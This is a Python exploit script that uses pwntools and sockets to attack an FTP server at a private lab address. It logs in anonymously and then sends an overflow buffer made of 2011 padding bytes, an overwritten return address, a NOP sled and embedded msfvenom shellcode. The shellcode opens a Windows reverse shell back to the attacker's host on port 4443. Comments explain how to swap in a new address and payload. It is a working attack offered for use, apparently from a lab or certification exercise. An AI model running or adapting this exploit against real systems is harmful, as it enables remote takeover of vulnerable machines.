
from pwn import *
import signal, sys, socket
from time import sleep

def def_handler(sig, frame):
    print("\n\n[!] Se tenso... \n")
    sys.exit(-1)

signal.signal(signal.SIGINT, def_handler)

def buffer():
    offset = 2011
    buffer = b'A' * offset
    #change the address here
    buffer += p32(0x7739b63b)
    buffer += b'\x90' * 200
    #BADCHARS -> "\x00\x0a\x0d\xf1"
    # msfvenom -p windows/shell_reverse_tcp LHOS=192.168.26.4 LPORT=4443 -a x86 --platform windows -b "\x00\x0d\x80" -e x86/shikata_ga_nai -f c
    #change your shellcode here
    shellcode = (b"\xbe\xd6\x4f\x27\xd3\xda\xc6\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
b"\x52\x83\xc7\x04\x31\x77\x0e\x03\xa1\x41\xc5\x26\xb1\xb6\x8b"
b"\xc9\x49\x47\xec\x40\xac\x76\x2c\x36\xa5\x29\x9c\x3c\xeb\xc5"
b"\x57\x10\x1f\x5d\x15\xbd\x10\xd6\x90\x9b\x1f\xe7\x89\xd8\x3e"
b"\x6b\xd0\x0c\xe0\x52\x1b\x41\xe1\x93\x46\xa8\xb3\x4c\x0c\x1f"
b"\x23\xf8\x58\x9c\xc8\xb2\x4d\xa4\x2d\x02\x6f\x85\xe0\x18\x36"
b"\x05\x03\xcc\x42\x0c\x1b\x11\x6e\xc6\x90\xe1\x04\xd9\x70\x38"
b"\xe4\x76\xbd\xf4\x17\x86\xfa\x33\xc8\xfd\xf2\x47\x75\x06\xc1"
b"\x3a\xa1\x83\xd1\x9d\x22\x33\x3d\x1f\xe6\xa2\xb6\x13\x43\xa0"
b"\x90\x37\x52\x65\xab\x4c\xdf\x88\x7b\xc5\x9b\xae\x5f\x8d\x78"
b"\xce\xc6\x6b\x2e\xef\x18\xd4\x8f\x55\x53\xf9\xc4\xe7\x3e\x96"
b"\x29\xca\xc0\x66\x26\x5d\xb3\x54\xe9\xf5\x5b\xd5\x62\xd0\x9c"
b"\x1a\x59\xa4\x32\xe5\x62\xd5\x1b\x22\x36\x85\x33\x83\x37\x4e"
b"\xc3\x2c\xe2\xc1\x93\x82\x5d\xa2\x43\x63\x0e\x4a\x89\x6c\x71"
b"\x6a\xb2\xa6\x1a\x01\x49\x21\xe5\x7e\x4b\xb5\x8d\x7c\x6b\xa4"
b"\x16\x08\x8d\xac\xb8\x5c\x06\x59\x20\xc5\xdc\xf8\xad\xd3\x99"
b"\x3b\x25\xd0\x5e\xf5\xce\x9d\x4c\x62\x3f\xe8\x2e\x25\x40\xc6"
b"\x46\xa9\xd3\x8d\x96\xa4\xcf\x19\xc1\xe1\x3e\x50\x87\x1f\x18"
b"\xca\xb5\xdd\xfc\x35\x7d\x3a\x3d\xbb\x7c\xcf\x79\x9f\x6e\x09"
b"\x81\x9b\xda\xc5\xd4\x75\xb4\xa3\x8e\x37\x6e\x7a\x7c\x9e\xe6"
b"\xfb\x4e\x21\x70\x04\x9b\xd7\x9c\xb5\x72\xae\xa3\x7a\x13\x26"
b"\xdc\x66\x83\xc9\x37\x23\xb3\x83\x15\x02\x5c\x4a\xcc\x16\x01"
b"\x6d\x3b\x54\x3c\xee\xc9\x25\xbb\xee\xb8\x20\x87\xa8\x51\x59"
b"\x98\x5c\x55\xce\x99\x74")
    buffer += shellcode
    try:
        print("creating a new connection with socket")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print("Couldn't connect to direction")
        sys.exit(-1)
    try:
        print("Conecting to the target")
        s.connect(('192.168.26.5', 21))

    except:
        print("Couldn't connect to target")
        sys.exit(-1)
    try:
        datos = "USER anonymous" + '\r\n'
        s.send(datos.encode())
        sleep(2)
        data = s.recv(1024)
        datos = "PASS TEST" + '\r\n'
        s.send(datos.encode())
        sleep(2)
        data = s.recv(1024)
        s.send(buffer)
        s.close()
    except:
        print("Couldn't send any information")
        sys.exit(-1)
        


if __name__ == '__main__':
    buffer() 
